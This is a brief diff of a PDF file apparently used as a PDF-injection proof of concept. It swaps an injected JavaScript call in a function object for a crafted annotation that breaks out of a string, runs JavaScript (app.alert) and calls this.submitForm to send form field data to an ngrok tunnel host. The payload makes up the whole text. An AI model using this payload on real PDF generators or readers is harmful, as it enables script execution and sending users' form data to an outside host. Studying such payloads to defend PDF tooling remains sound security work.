@@ -1,10 +1,11 @@
 /%PDF-1.4
 1 0 obj
 <<
-  /FunctionType 4
-  /Domain [(console.log("Hello, this is code running in " + location.href)) 0]
-  /Range [0 0]
-  /Length 12
+ #)>>>><</Type/Annot/Rect[ 0 0 900            900]/Subtype/Widget/Parent<</FT/Tx/T(foo)/V(bar)>>/A<</S/JavaScript/JS(
+    app.alert(1);
+    this.submitForm('https://4019-112-215-235-168.ngrok.io', false,            false, ['foo']);
+    )/( 
+    
 >>
 stream
 {
